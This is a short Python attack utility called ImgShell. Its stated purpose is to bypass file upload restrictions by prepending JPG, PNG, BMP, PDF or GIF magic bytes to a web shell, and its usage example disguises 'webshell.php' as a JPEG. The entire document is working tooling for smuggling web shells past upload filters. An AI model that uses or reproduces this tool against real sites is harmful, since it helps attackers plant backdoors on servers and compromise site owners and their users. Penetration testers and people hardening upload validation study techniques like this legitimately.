#!/usr/local/bin/python3

"""
Script Name: ImgShell
Description: ImgShell utilizes commonly accepted file headers to prepend to your web shell, enabling bypassing of file upload restrictions through the use of magic bytes.
Author: Adair John Collins
Version: 1.0
"""

import os
import sys

def prepend_header(file_path, file_type):
    # Define file headers in hexadecimal
    headers = {
        "jpg": b"\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01",
        "png": b"\x89\x50\x4E\x47\x0D\x0A\x1A\x0A",
        "bmp": b"\x42\x4D",
        "pdf": b"\x25\x50\x44\x46\x2D",  # %PDF- in hex
        "gif": b"\x47\x49\x46\x38\x39\x61"  # GIF89a in hex
    }

    try:
        # Check if the file type is supported
        if file_type not in headers:
            raise ValueError("Unsupported file type. Supported types are: jpg, png, bmp, pdf, gif")

        # Read the original file content
        with open(file_path, 'rb') as f:
            original_content = f.read()

        # Prepend the header
        new_content = headers[file_type] + original_content

        # Write the new content back to the file
        with open(file_path, 'wb') as f:
            f.write(new_content)

        print(f"Header for {file_type.upper()} prepended successfully.")

    except FileNotFoundError:
        print("Error: The specified file was not found.")
    except ValueError as ve:
        print(f"Error: {ve}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

def print_help():
    help_message = """
    Usage: python imgsh.py <file_path> <file_type>
    <file_path> : Path to the file you want to prepend the header to.
    <file_type> : Type of the file (jpg, png, bmp, pdf, gif).
    
    Example:
    python imgsh.py webshell.php jpg
    """
    print(help_message)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print_help()
    else:
        file_path = sys.argv[1]
        file_type = sys.argv[2]
        prepend_header(file_path, file_type)

